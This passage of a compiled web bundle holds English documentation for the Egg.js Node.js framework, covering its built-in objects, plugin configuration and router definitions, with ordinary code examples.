  app.on('request', (ctx) => {
    // log receive request
  });
  app.on('response', (ctx) => {
    // ctx.starttime is set by framework
    const used = Date.now() - ctx.starttime;
    // log total cost
  });
};
`,paraId:5,tocIndex:1},{value:"Application object can be accessed almost anywhere in application, here are a few commonly used access ways:",paraId:6,tocIndex:2},{value:"Almost all files (Controller, Service, Schedule, etc.) loaded by the [Loader] (../advanced/loader.md) can export a function that is called by the Loader and uses the app as a parameter:",paraId:7,tocIndex:2},{value:"App start script",paraId:8,tocIndex:2},{value:`// app.js
module.exports = (app) => {
  app.cache = new Cache();
};
`,paraId:9,tocIndex:2},{value:"Controller file",paraId:10,tocIndex:2},{value:`// app/controller/user.js
class UserController extends Controller {
  async fetch() {
    this.ctx.body = this.app.cache.get(this.ctx.query.id);
  }
}
`,paraId:11,tocIndex:2},{value:"Like the ",paraId:12,tocIndex:2},{value:"Koa",paraId:12,tocIndex:2},{value:", on the Context object, we can access the Application object via ",paraId:12,tocIndex:2},{value:"ctx.app",paraId:12,tocIndex:2},{value:". Use the above Controller file as an example:",paraId:12,tocIndex:2},{value:`// app/controller/user.js
class UserController extends Controller {
  async fetch() {
    this.ctx.body = this.ctx.app.cache.get(this.ctx.query.id);
  }
}
`,paraId:13,tocIndex:2},{value:"In the instance objects that inherited from the Controller and Service base classes, the Application object can be accessed via ",paraId:14,tocIndex:2},{value:"this.app",paraId:14,tocIndex:2},{value:".",paraId:14,tocIndex:2},{value:`// app/controller/user.js
class UserController extends Controller {
  async fetch() {
    this.ctx.body = this.app.cache.get(this.ctx.query.id);
  }
}
`,paraId:15,tocIndex:2},{value:"Context is a ",paraId:16,tocIndex:3},{value:"request level object",paraId:16,tocIndex:3},{value:", inherited from ",paraId:16,tocIndex:3},{value:"Koa.Context",paraId:16,tocIndex:3},{value:". When a request is received every time, the framework instantiates a Context object that encapsulates the information requested by the user and provides a number of convenient ways to get the request parameter or set the response information. The framework will mount all of the ",paraId:16,tocIndex:3},{value:"Service",paraId:17,tocIndex:3},{value:" on the Context instance, and some plugins will mount some other methods and objects on it (",paraId:16,tocIndex:3},{value:"egg-sequelize",paraId:16,tocIndex:3},{value:" will mount all the models on the Context).",paraId:16,tocIndex:3},{value:"The most common way to get the Context instance is in ",paraId:18,tocIndex:4},{value:"Middleware",paraId:19,tocIndex:4},{value:", ",paraId:18,tocIndex:4},{value:"Controller",paraId:20,tocIndex:4},{value:", and ",paraId:18,tocIndex:4},{value:"Service",paraId:21,tocIndex:4},{value:". The access method in the Controller is shown in the above example. In the Service, the access way is same as Controller. The access Context method in the Middleware of Egg is same as ",paraId:18,tocIndex:4},{value:"Koa",paraId:18,tocIndex:4},{value:" framework gets the Context object in its middleware.",paraId:18,tocIndex:4},{value:"The ",paraId:22,tocIndex:4},{value:"Middleware",paraId:23,tocIndex:4},{value:" of Egg also supports Koa v1 and Koa v2 two different middleware coding formats. use different format, the way to access Context instance is also slightly different:",paraId:22,tocIndex:4},{value:`// Koa v1
function* middleware(next) {
  // this is instance of Context
  console.log(this.query);
  yield next;
}

// Koa v2
async function middleware(ctx, next) {
  // ctx is instance of Context
  console.log(ctx.query);
}
`,paraId:24,tocIndex:4},{value:"In addition to the request can get the Context instance, in some non-request scenario we need to access service / model and other objects on the Context instance, we can use",paraId:25,tocIndex:4},{value:"Application.createAnonymousContext ()",paraId:25,tocIndex:4},{value:" method to create an anonymous Context instance:",paraId:25,tocIndex:4},{value:`// app.js
module.exports = (app) => {
  app.beforeStart(async () => {
    const ctx = app.createAnonymousContext();
    // preload before app start
    await ctx.service.posts.load();
  });
};
`,paraId:26,tocIndex:4},{value:"Each task in ",paraId:27,tocIndex:4},{value:"Schedule",paraId:28,tocIndex:4},{value:" takes a Context instance as a parameter so that we can more easily execute some schedule business logic:",paraId:27,tocIndex:4},{value:`// app/schedule/refresh.js
exports.task = async (ctx) => {
  await ctx.service.posts.refresh();
};
`,paraId:29,tocIndex:4},{value:"Request is a ",paraId:30,tocIndex:5},{value:"request level object",paraId:30,tocIndex:5},{value:", inherited from ",paraId:30,tocIndex:5},{value:"Koa.Request",paraId:30,tocIndex:5},{value:". Encapsulates the Node.js native HTTP Request object, and provides a set of helper methods to get commonly used parameters of HTTP requests.",paraId:30,tocIndex:5},{value:"Response is a ",paraId:31,tocIndex:5},{value:"request level object",paraId:31,tocIndex:5},{value:", inherited from ",paraId:31,tocIndex:5},{value:"Koa.Response",paraId:31,tocIndex:5},{value:". Encapsulates the Node.js native HTTP Response object, and provides a set of helper methods to set the HTTP response.",paraId:31,tocIndex:5},{value:"We can get the Request(",paraId:32,tocIndex:6},{value:"ctx.request",paraId:32,tocIndex:6},{value:") and Response (",paraId:32,tocIndex:6},{value:" ctx.response",paraId:32,tocIndex:6},{value:") instances of the current request on the Context instance.",paraId:32,tocIndex:6},{value:`// app/controller/user.js
class UserController extends Controller {
  async fetch() {
    const { app, ctx } = this;
    const id = ctx.request.query.id;
    ctx.response.body = app.cache.get(id);
  }
}
`,paraId:33,tocIndex:6},{value:"Koa",paraId:34,tocIndex:6},{value:" will proxy some methods and properties of Request and Response on Context, see ",paraId:34,tocIndex:6},{value:"Koa.Context",paraId:34,tocIndex:6},{value:".",paraId:34,tocIndex:6},{value:"ctx.request.query.id",paraId:34,tocIndex:6},{value:" and",paraId:34,tocIndex:6},{value:" ctx.query.id",paraId:34,tocIndex:6},{value:" are equivalent in the above example , ",paraId:34,tocIndex:6},{value:"ctx.response.body =",paraId:34,tocIndex:6},{value:" and ",paraId:34,tocIndex:6},{value:"ctx.body =",paraId:34,tocIndex:6},{value:" are equivalent.",paraId:34,tocIndex:6},{value:"It should be noted that get the body of POST should use ",paraId:34,tocIndex:6},{value:"ctx.request.body",paraId:34,tocIndex:6},{value:" instead of",paraId:34,tocIndex:6},{value:" ctx.body",paraId:34,tocIndex:6},{value:".",paraId:34,tocIndex:6},{value:"Egg provides a Controller base class and recommends that all ",paraId:35,tocIndex:7},{value:"Controller",paraId:36,tocIndex:7},{value:" inherit from the base class. The Controller base class has the following properties:",paraId:35,tocIndex:7},{value:"ctx",paraId:37,tocIndex:7},{value:" - ",paraId:37,tocIndex:7},{value:"Context",paraId:38,tocIndex:7},{value:" instance of the current request.",paraId:37,tocIndex:7},{value:"app",paraId:37,tocIndex:7},{value:" - ",paraId:37,tocIndex:7},{value:"Application",paraId:39,tocIndex:7},{value:" instance.",paraId:37,tocIndex:7},{value:"config",paraId:37,tocIndex:7},{value:" - application ",paraId:37,tocIndex:7},{value:"configuration",paraId:40,tocIndex:7},{value:".",paraId:37,tocIndex:7},{value:"service",paraId:37,tocIndex:7},{value:" - all ",paraId:37,tocIndex:7},{value:"service",paraId:41,tocIndex:7},{value:"(./ service.md) of application.",paraId:37,tocIndex:7},{value:"logger",paraId:37,tocIndex:7},{value:" - the encapsulated logger object for the current controller.",paraId:37,tocIndex:7},{value:"In the Controller file, there are two ways to use the Controller base class:",paraId:42,tocIndex:7},{value:`// app/controller/user.js

// get from egg (recommend)
const Controller = require('egg').Controller;
class UserController extends Controller {
  // implement
}
module.exports = UserController;

// get from app instance
module.exports = (app) => {
  return class UserController extends app.Controller {
    // implement
  };
};
`,paraId:43,tocIndex:7},{value:"Egg provides a Service base class and recommends that all ",paraId:44,tocIndex:8},{value:"Service",paraId:45,tocIndex:8},{value:" inherit from the base class.",paraId:44,tocIndex:8},{value:"The properties of the Service base class are the same as those of the ",paraId:46,tocIndex:8},{value:"Controller",paraId:47,tocIndex:8},{value:" base class, the access method is similar:",paraId:46,tocIndex:8},{value:`// app/service/user.js

// get from egg (recommend)
const Service = require('egg').Service;
class UserService extends Service {
  // implement
}
module.exports = UserService;

// get from app instance
module.exports = (app) => {
  return class UserService extends app.Service {
    // implement
  };
};
`,paraId:48,tocIndex:8},{value:"Helper is used to provide some useful utility functions. Its role is that we can put some commonly used functions into helper.js, so we can use JavaScript to write complex logic, avoid the logic being scattered everywhere, and can be more convenient to write test cases.",paraId:49,tocIndex:9},{value:"The Helper itself is a class that has the same properties as the ",paraId:50,tocIndex:9},{value:"Controller",paraId:51,tocIndex:9},{value:" base class, and it will be instantiated at each request so that all functions on the Helper can also get context of the current request.",paraId:50,tocIndex:9},{value:"We can get the Helper(",paraId:52,tocIndex:10},{value:"ctx.helper",paraId:52,tocIndex:10},{value:") instance of the current request on the Context instance.",paraId:52,tocIndex:10},{value:`// app/controller/user.js
class UserController extends Controller {
  async fetch() {
    const { app, ctx } = this;
    const id = ctx.query.id;
    const user = app.cache.get(id);
    ctx.body = ctx.helper.formatUser(user);
  }
}
`,paraId:53,tocIndex:10},{value:"In addition, Helper instances can also be accessed in template, for example, we can get ",paraId:54,tocIndex:10},{value:"shtml",paraId:54,tocIndex:10},{value:" method provided by ",paraId:54,tocIndex:10},{value:"security",paraId:55,tocIndex:10},{value:" plugin in template.",paraId:54,tocIndex:10},{value:`// app/view/home.nj
{{ helper.shtml(value) }}
`,paraId:56,tocIndex:10},{value:"In application development, we may often customize some helper methods, such as ",paraId:57,tocIndex:11},{value:"formatUser",paraId:57,tocIndex:11},{value:" in the above example, we can customize helper method with a way of ",paraId:57,tocIndex:11},{value:"framework extension",paraId:58,tocIndex:11},{value:".",paraId:57,tocIndex:11},{value:`// app/extend/helper.js
module.exports = {
  formatUser(user) {
    return only(user, ['name', 'phone']);
  },
};
`,paraId:59,tocIndex:11},{value:"We recommend application development to follow the principle of configuration and code separation, put hard-coded business in configuration file, and the configuration file supports different runtime environments using different configurations, it is very convenient to use it. the framework, plugin and application-level configurations are available via the Config object. For configuration of Egg, read ",paraId:60,tocIndex:12},{value:"Configuration",paraId:61,tocIndex:12},{value:" in detail.",paraId:60,tocIndex:12},{value:"We can get the config object from the Application instance via ",paraId:62,tocIndex:13},{value:"app.config",paraId:62,tocIndex:13},{value:", or get the config object via",paraId:62,tocIndex:13},{value:" this.config",paraId:62,tocIndex:13},{value:" on the instance of Controller, Service or Helper.",paraId:62,tocIndex:13},{value:"Egg builds in powerful ",paraId:63,tocIndex:14},{value:"logger",paraId:64,tocIndex:14},{value:", it is very convenient to print a variety of levels of logs to the corresponding log file, each logger object provides 4 level methods:",paraId:63,tocIndex:14},{value:"logger.debug()",paraId:65,tocIndex:14},{value:"logger.info()",paraId:65,tocIndex:14},{value:"logger.warn()",paraId:65,tocIndex:14},{value:"logger.error()",paraId:65,tocIndex:14},{value:"Egg provides a number of Logger object, we simply introduce how to get each Logger and its use scenario.",paraId:66,tocIndex:14},{value:"We can get it via ",paraId:67,tocIndex:15},{value:"app.logger",paraId:67,tocIndex:15},{value:". If we want to do some application-level logging, such as logging some data in the startup phase, logging some business informations that are unrelated to request, those can be done by App Logger.",paraId:67,tocIndex:15},{value:"We can get it via ",paraId:68,tocIndex:16},{value:"app.coreLogger",paraId:68,tocIndex:16},{value:", and we should not print logs via CoreLogger when developing applications. the framework and plugins need to print application-level logs to make it easier to distinguish from logs printed by applications and logs printed by frameworks, the logs printed by the CoreLogger will be placed in a different file than the Logger.",paraId:68,tocIndex:16},{value:"We can get it via ",paraId:69,tocIndex:17},{value:"ctx.logger",paraId:69,tocIndex:17},{value:" from Context instance, we can see from access method, Context Logger must be related to the request, it will take current request related information (such as ",paraId:69,tocIndex:17},{value:"[$userId/$ip/$traceId/${cost}ms $method $url]",paraId:69,tocIndex:17},{value:") in the front of logs, with this information, we can quickly locate requests from logs and concatenate all logs in one request.",paraId:69,tocIndex:17},{value:"We can get it via ",paraId:70,tocIndex:18},{value:"ctx.coreLogger",paraId:70,tocIndex:18},{value:", the difference between the Context Logger is that only plugins and framework will log via it.",paraId:70,tocIndex:18},{value:"We can get them via ",paraId:71,tocIndex:19},{value:"this.logger",paraId:71,tocIndex:19},{value:" in Controller and Service instance, they are essentially a Context Logger, but additional file path will be added to logs, easy to locate the log print location.",paraId:71,tocIndex:19},{value:"Subscription is a common model for subscribing, for example, the consumer in message broker or schedule, so we provide the Subscription base class to normalize this model.",paraId:72,tocIndex:20},{value:"The base class of Subscription can be exported in the following way.",paraId:73,tocIndex:20},{value:`const Subscription = require('egg').Subscription;

class Schedule extends Subscription {
  // This method should be implemented
  // subscribe can be async function or generator function
  async subscribe() {}
}
`,paraId:74,tocIndex:20},{value:"We recommend plugin developers to implement based on this model, For example, ",paraId:75,tocIndex:20},{value:"Schedule",paraId:76,tocIndex:20},{value:".",paraId:75,tocIndex:20}]},27860:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(15681);const t=[{value:"Plugin mechanism is a major feature of our framework. Not only can it ensure that the core of the framework is sufficiently streamlined, stable and efficient, but also can promote the reuse of business logic and the formation of an ecosystem. In the following sections, we will try to answer questions such as",paraId:0},{value:"Koa already has a middleware mechanism, why plugins?",paraId:1},{value:"What are the differences/relationship between middleware and plugins?",paraId:1},{value:"How do I use a plugin?",paraId:1},{value:"How do I write a plugin?",paraId:1},{value:"...",paraId:1},{value:"Here are some of the issues we think that can arise when using Koa middleware:",paraId:2,tocIndex:0},{value:"Middleware loading is sequential and it is the user's responsibility to setup the execution sequence since middleware mechanism can not manage the actual order. This, in fact, is not very friendly. When the order is not correct, it can lead to unexpected results.",paraId:3,tocIndex:0},{value:"Middleware positioning is geared towards intercepting user requests to add additional logic before or after such as: authentication, security checks, logging and so on. However, in some cases, such functionality can be unrelated to the request, for example, timing tasks, message subscriptions, back-end logic and so on.",paraId:3,tocIndex:0},{value:"Some features include very complex initialization logic that needs to be done at application startup. This is obviously not suitable for middleware to achieve.",paraId:3,tocIndex:0},{value:"To sum up, we need a more powerful mechanism to manage, orchestrate those relatively independent business logic.",paraId:4,tocIndex:0},{value:'A plugin is actually a "mini-application", almost the same as an app:',paraId:5,tocIndex:1},{value:"It contains ",paraId:6,tocIndex:1},{value:"Services",paraId:7,tocIndex:1},{value:", ",paraId:6,tocIndex:1},{value:"middleware",paraId:8,tocIndex:1},{value:", ",paraId:6,tocIndex:1},{value:"config",paraId:9,tocIndex:1},{value:", ",paraId:6,tocIndex:1},{value:"framework extensions",paraId:10,tocIndex:1},{value:", etc.",paraId:6,tocIndex:1},{value:"It does not have separate ",paraId:6,tocIndex:1},{value:"Router",paraId:11,tocIndex:1},{value:" and ",paraId:6,tocIndex:1},{value:"Controller",paraId:12,tocIndex:1},{value:".",paraId:6,tocIndex:1},{value:"It does not have ",paraId:6,tocIndex:1},{value:"plugin.js",paraId:6,tocIndex:1},{value:", it could only define dependencies with others, but could not deside whether other plugin is enable or not.",paraId:6,tocIndex:1},{value:"Their relationship is:",paraId:13,tocIndex:1},{value:"Applications can be directly introduced into Koa's middleware.",paraId:14,tocIndex:1},{value:"When it comes to the scene mentioned in the previous section, the app needs to import the plugin.",paraId:14,tocIndex:1},{value:"The plugin itself can contain middleware.",paraId:14,tocIndex:1},{value:"Multiple plugins can be wrapped as an ",paraId:14,tocIndex:1},{value:"upper frame",paraId:15,tocIndex:1},{value:".",paraId:14,tocIndex:1},{value:"Plugins are usually added via the npm module:",paraId:16,tocIndex:2},{value:`$ npm i egg-mysql --save
`,paraId:17,tocIndex:2},{value:"Note: We recommend introducing dependencies in the ",paraId:18,tocIndex:2},{value:"^",paraId:18,tocIndex:2},{value:" way, and locking versions are strongly discouraged.",paraId:18,tocIndex:2},{value:`{
  "dependencies": {
    "egg-mysql": "^ 3.0.0"
  }
}
`,paraId:19,tocIndex:2},{value:"Then you need to declare it in the ",paraId:20,tocIndex:2},{value:"config / plugin.js",paraId:20,tocIndex:2},{value:" application or framework:",paraId:20,tocIndex:2},{value:`// config / plugin.js
// Use mysql plugin
exports.mysql = {
  enable: true,
  package: 'egg-mysql',
};
`,paraId:21,tocIndex:2},{value:"You can directly use the functionality provided by the plugin:",paraId:22,tocIndex:2},{value:`app.mysql.query(sql, values);
`,paraId:23,tocIndex:2},{value:"Each configuration item in ",paraId:24,tocIndex:3},{value:"plugin.js",paraId:24,tocIndex:3},{value:" supports:",paraId:24,tocIndex:3},{value:"{Boolean} enable",paraId:25,tocIndex:3},{value:" - Whether to enable this plugin, the default is true",paraId:25,tocIndex:3},{value:"{String} package",paraId:25,tocIndex:3},{value:" -",paraId:25,tocIndex:3},{value:"npm",paraId:25,tocIndex:3},{value:" module name, plugin is imported via ",paraId:25,tocIndex:3},{value:"npm",paraId:25,tocIndex:3},{value:" module",paraId:25,tocIndex:3},{value:"{String} path",paraId:25,tocIndex:3},{value:" - The plugin's absolute path, mutually exclusive with package configuration",paraId:25,tocIndex:3},{value:"{Array} env",paraId:25,tocIndex:3},{value:" - Only enable plugin in the specified runtime (environment), overriding the plugin's own configuration in ",paraId:25,tocIndex:3},{value:"package.json",paraId:25,tocIndex:3},{value:"The application does not need the package or path configuration when using the plugins built in the upper framework. You only need to specify whether they are enabled or not:",paraId:26,tocIndex:4},{value:`// For the built-in plugin, you can use the following simple way to turn on or off
exports.onerror = false;
`,paraId:27,tocIndex:4},{value:"We also support ",paraId:28,tocIndex:5},{value:"plugin.{Env}.js",paraId:28,tocIndex:5},{value:", which will load plugin configurations based on ",paraId:28,tocIndex:5},{value:"Runtime",paraId:29,tocIndex:5},{value:".",paraId:28,tocIndex:5},{value:"For example, if you want to load the plugin ",paraId:30,tocIndex:5},{value:"egg-dev",paraId:30,tocIndex:5},{value:" only in the local environment, you can install it to ",paraId:30,tocIndex:5},{value:"devDependencies",paraId:30,tocIndex:5},{value:" and adjust the plugin configuration accordingly.",paraId:30,tocIndex:5},{value:`// npm i egg-dev --save-dev
// package.json
{
\xA0\xA0"devDependencies": {
\xA0\xA0\xA0\xA0"egg-dev": "*"
\xA0\xA0}
}
`,paraId:31,tocIndex:5},{value:"Then declare in ",paraId:32,tocIndex:5},{value:"plugin.local.js",paraId:32,tocIndex:5},{value:":",paraId:32,tocIndex:5},{value:`// config / plugin.local.js
exports.dev = {
  enable: true,
  package: 'egg-dev',
};
`,paraId:33,tocIndex:5},{value:"In this way, ",paraId:34,tocIndex:5},{value:"npm i --production",paraId:34,tocIndex:5},{value:" in the production environment does not need to download the",paraId:34,tocIndex:5},{value:"egg-dev",paraId:34,tocIndex:5},{value:" package.",paraId:34,tocIndex:5},{value:"Note:",paraId:35,tocIndex:5},{value:"plugin.default.js",paraId:36,tocIndex:5},{value:" does not exists. Use ",paraId:36,tocIndex:5},{value:"local",paraId:36,tocIndex:5},{value:" for dev environments.",paraId:36,tocIndex:5},{value:"Use this feature only in the application layer. Do not use it in the framework layer.",paraId:37,tocIndex:5},{value:"The ",paraId:38,tocIndex:6},{value:"package",paraId:38,tocIndex:6},{value:" is introduced in the ",paraId:38,tocIndex:6},{value:"npm",paraId:38,tocIndex:6},{value:" style which is the most common way to import",paraId:38,tocIndex:6},{value:"path",paraId:38,tocIndex:6},{value:" is an absolute path introduced when you want to load the plugin from different location such as when a plugin is still at the development stage or not available on ",paraId:38,tocIndex:6},{value:"npm",paraId:38,tocIndex:6},{value:"To see the application of these two scenarios, please see ",paraId:38,tocIndex:6},{value:"progressive development",paraId:39,tocIndex:6},{value:".",paraId:38,tocIndex:6},{value:`// config / plugin.js
const path = require('path');
exports.mysql = {
  enable: true,
  path: path.join(__dirname, '../lib/plugin/egg-mysql'),
};
`,paraId:40,tocIndex:6},{value:"The plugin will usually contain its own default configuration, you can overwrite this in ",paraId:41,tocIndex:7},{value:"config.default.js",paraId:41,tocIndex:7},{value:":",paraId:41,tocIndex:7},{value:`// config / config.default.js
exports.mysql = {
  client: {
    host: 'mysql.com',
    port: '3306',
    user: 'test_user',
    password: 'test_password',
    database: 'test',
  },
};
`,paraId:42,tocIndex:7},{value:"Specific consolidation rules can be found in ",paraId:43,tocIndex:7},{value:"Configuration",paraId:44,tocIndex:7},{value:".",paraId:43,tocIndex:7},{value:"Framework has default built-in plugins for enterprise applications ",paraId:45,tocIndex:8},{value:"Common plugins",paraId:45,tocIndex:8},{value:`:
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"onerror",paraId:45,tocIndex:8},{value:` Uniform Exception Handling
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"Session",paraId:45,tocIndex:8},{value:` Session implementation
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"i18n",paraId:45,tocIndex:8},{value:` Multilingual
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"watcher",paraId:45,tocIndex:8},{value:` File and folder monitoring
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"multipart",paraId:45,tocIndex:8},{value:` File Streaming Upload
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"security",paraId:45,tocIndex:8},{value:` Security
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"development",paraId:45,tocIndex:8},{value:` Development Environment Configuration
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"logrotator",paraId:45,tocIndex:8},{value:` Log segmentation
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"schedule",paraId:45,tocIndex:8},{value:` Timing tasks
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"static",paraId:45,tocIndex:8},{value:` Static server
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"jsonp",paraId:45,tocIndex:8},{value:` jsonp support
\xA0\xA0- `,paraId:45,tocIndex:8},{value:"view",paraId:45,tocIndex:8},{value:" Template Engine",paraId:45,tocIndex:8},{value:"More community plugins can be found on GitHub ",paraId:45,tocIndex:8},{value:"egg-plugin",paraId:45,tocIndex:8},{value:".",paraId:45,tocIndex:8},{value:"See the documentation ",paraId:46,tocIndex:9},{value:"plugin development",paraId:47,tocIndex:9},{value:".",paraId:46,tocIndex:9}]},40791:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(55506);const t=[{value:"Router is mainly used to describe the corresponding relationship between the request URL and the Controller that processes the request eventually. All routing rules are unified in the ",paraId:0},{value:"app/router.js",paraId:0},{value:" file by the framework.",paraId:0},{value:"By unifying routing rules, we can avoid the routing logics scattered in many places which may cause many unknown conflicts, and we can more easily check global routing rules.",paraId:1},{value:"Define the routing rule in ",paraId:2,tocIndex:0},{value:"app/router.js",paraId:2,tocIndex:0},{value:" file",paraId:2,tocIndex:0},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('/user/:id', controller.user.info);
};
`,paraId:3,tocIndex:0},{value:"Implement the Controller in ",paraId:4,tocIndex:0},{value:"app/controller",paraId:4,tocIndex:0},{value:" directory",paraId:4,tocIndex:0},{value:`// app/controller/user.js
class UserController extends Controller {
  async info() {
    const { ctx } = this;
    ctx.body = {
      name: \`hello \${ctx.params.id}\`,
    };
  }
}
`,paraId:5,tocIndex:0},{value:"This simplest Router is done by now, when users do the request ",paraId:6,tocIndex:0},{value:"GET /user/123",paraId:6,tocIndex:0},{value:", the info function in ",paraId:6,tocIndex:0},{value:"user.js",paraId:6,tocIndex:0},{value:" will be invoked.",paraId:6,tocIndex:0},{value:"Below is the complete definition of router, parameters can be determined depending on different scenes.",paraId:7,tocIndex:1},{value:`router.verb('path-match', app.controller.action);
router.verb('router-name', 'path-match', app.controller.action);
router.verb('path-match', middleware1, ..., middlewareN, app.controller.action);
router.verb('router-name', 'path-match', middleware1, ..., middlewareN, app.controller.action);
`,paraId:8,tocIndex:1},{value:"The complete definition of router includes 5 major parts:",paraId:9,tocIndex:1},{value:`verb - actions that users trigger, including get, post and so on, and will be explained in detail later.
`,paraId:10,tocIndex:1},{value:"router.head - HEAD",paraId:11,tocIndex:1},{value:"router.options - OPTIONS",paraId:11,tocIndex:1},{value:"router.get - GET",paraId:11,tocIndex:1},{value:"router.put - PUT",paraId:11,tocIndex:1},{value:"router.post - POST",paraId:11,tocIndex:1},{value:"router.patch - PATCH",paraId:11,tocIndex:1},{value:"router.delete - DELETE",paraId:11,tocIndex:1},{value:"router.del - this is a alias method due to the reservation of delete.",paraId:11,tocIndex:1},{value:"router.redirect - redirects the request URL. For example, the most common case is to redirect the request accessing the root directory to the homepage.",paraId:11,tocIndex:1},{value:"router-name defines a alias for the route, and URL can be generated by helper method ",paraId:10,tocIndex:1},{value:"pathFor",paraId:10,tocIndex:1},{value:" and ",paraId:10,tocIndex:1},{value:"urlFor",paraId:10,tocIndex:1},{value:" provided by Helper. (Optional)",paraId:10,tocIndex:1},{value:"path-match - URL path of the route.",paraId:10,tocIndex:1},{value:"middleware1 - multiple Middlewares can be configured in Router. (Optional)",paraId:10,tocIndex:1},{value:`controller - set the route to map to the specific controller, and the controller can be written in two types:
`,paraId:10,tocIndex:1},{value:"app.controller.user.fetch",paraId:12,tocIndex:1},{value:" - directly point to a controller",paraId:12,tocIndex:1},{value:"'user.fetch'",paraId:12,tocIndex:1},{value:" - simplified as a string,",paraId:12,tocIndex:1},{value:"multiple Middlewares can be configured to execute serially in Router definition",paraId:13,tocIndex:2},{value:"Controller must be defined under ",paraId:13,tocIndex:2},{value:"app/controller",paraId:13,tocIndex:2},{value:" directory",paraId:13,tocIndex:2},{value:"multiple Controllers can be defined within one file, and the specific one can be specified in the form of ",paraId:13,tocIndex:2},{value:"${fileName}.${functionName}",paraId:13,tocIndex:2},{value:" when defining the routing rule.",paraId:13,tocIndex:2},{value:"Controller supports sub-directories, and the specific one can be specified in the form of ",paraId:13,tocIndex:2},{value:"${directoryName}.${fileName}.${functionName}",paraId:13,tocIndex:2},{value:" when defining the routing rule.",paraId:13,tocIndex:2},{value:"Here are some examples of writing routing rules:",paraId:14,tocIndex:2},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.get('/home', controller.home);
  router.get('/user/:id', controller.user.page);
  router.post('/admin', isAdmin, controller.admin);
  router.post('/user', isLoginUser, hasAdminPermission, controller.user.create);
  router.post('/api/v1/comments', controller.v1.comments.create); // app/controller/v1/comments.js
};
`,paraId:15,tocIndex:2},{value:"We provide ",paraId:16,tocIndex:3},{value:"app.router.resources('routerName', 'pathMatch', 'controller')",paraId:16,tocIndex:3},{value:" to generate ",paraId:16,tocIndex:3},{value:"CRUD",paraId:16,tocIndex:3},{value:" structures on a path for convenience if you prefer the RESTful style URL definition.",paraId:16,tocIndex:3},{value:`// app/router.js
module.exports = (app) => {
  const { router, controller } = app;
  router.resources('posts', '/posts', controller.posts);
  router.resources('users', '/api/v1/users', controller.v1.users); // app/controller/v1/users.js
};
`,paraId:17,tocIndex:3},{value:"The codes above produce a bunch of CRUD path structures for Controller ",paraId:18,tocIndex:3},{value:"app/controller/posts.js",paraId:18,tocIndex:3},{value:", and the only thing you should do next is to implement related functions in ",paraId:18,tocIndex:3},{value:"posts.js",paraId:18,tocIndex:3},{value:".",paraId:18,tocIndex:3},{value:"Method",paraId:19,tocIndex:3},{value:"Path",paraId:19,tocIndex:3},{value:"Route Name",paraId:19,tocIndex:3},{value:"Controller.Action",paraId:19,tocIndex:3},{value:"GET",paraId:19,tocIndex:3},{value:"/posts",paraId:19,tocIndex:3},{value:"posts",paraId:19,tocIndex:3},{value:"app.controllers.posts.index",paraId:19,tocIndex:3},{value:"GET",paraId:19,tocIndex:3},{value:"/posts/new",paraId:19,tocIndex:3},{value:"new_post",paraId:19,tocIndex:3},{value:"app.controllers.posts.new",paraId:19,tocIndex:3},{value:"GET",paraId:19,tocIndex:3},{value:"/posts/:id",paraId:19,tocIndex:3},{value:"post",paraId:19,tocIndex:3},{value:"app.controllers.posts.show",paraId:19,tocIndex:3},{value:"GET",paraId:19,tocIndex:3},{value:"/posts/:id/edit",paraId:19,tocIndex:3},{value:"edit_post",paraId:19,tocIndex:3},{value:"app.controllers.posts.edit",paraId:19,tocIndex:3},{value:"POST",paraId:19,tocIndex:3},{value:"/posts",paraId:19,tocIndex:3},{value:"posts",paraId:19,tocIndex:3},{value:"app.controllers.posts.create",paraId:19,tocIndex:3},{value:"PATCH",paraId:19,tocIndex:3},{value:"/posts/:id",paraId:19,tocIndex:3},{value:"post",paraId:19,tocIndex:3},{value:"app.controllers.posts.update",paraId:19,tocIndex:3},{value:"DELETE",paraId:19,tocIndex:3},{value:"/posts/:id",paraId:19,tocIndex:3},{value:"post",paraId:19,tocIndex:3},{value:"app.controllers.posts.destroy",paraId:19,tocIndex:3},{value:`// app/controller/posts.js
exports.index = async () => {};

exports.new = async () => {};

exports.create = async () => {};

exports.show = async () => {};

exports.edit = async () => {};

exports.update = async () => {};

exports.destroy = async () => {};
`,paraId:20,tocIndex:3},{value:"Methods that are not needed may not be implemented in ",paraId:21,tocIndex:3},{value:"posts.js",paraId:21,tocIndex:3},{value:" and the related URL paths will not be registered to Router neither.",paraId:21,tocIndex:3},{value:"More practical examples will be shown below to demonstrate how to use the router.",paraId:22,tocIndex:4},{value:`// app/router.js
module.exports = (app) => {
  app.router.get('/search', app.controller.search.index);
};

// app/controller/search.js
exports.index = async (ctx) => {
  ctx.body = \`search: \${ctx.query.name}\`;
};

// curl http://127.0.0.1:7001/search?name=egg
`,paraId:23,tocIndex:6},{value:`// app/router.js
module.exports = (app) => {
  app.router.get('/user/:id/:name', app.controller.user.info);
};

// app/controller/user.js
exports.info = async (ctx) => {
  ctx.body = \`user: \${ctx.params.id}, \${ctx.params.name}\`;
};

// curl http://127.0.0.1:7001/user/123/xiaoming
`,paraId:24,tocIndex:7},{value:"Regular expressions, as well, can be used in routing rules to acquire parameters more flexibly:",paraId:25,tocIndex:8},{value:`// app/router.js
module.exports = (app) => {
  app.router.get(
    /^\\/package\\/([\\w-.]+\\/[\\w-.]+)$/,
    app.controller.package.detail,
  );
};

// app/controller/package.js
exports.detail = async (ctx) => {
  // If the request URL is matched by the regular expression, parameters can be acquired from ctx.params according to the capture group orders.
  // For the user request below, for example, the value of \`ctx.params[0]\` is \`egg/1.0.0\`
  ctx.body = \`package:\${ctx.params[0]}\`;
};

// curl http://127.0.0.1:7001/package/egg/1.0.0
`,paraId:26,tocIndex:8},{value:`// app/router.js
module.exports = (app) => {
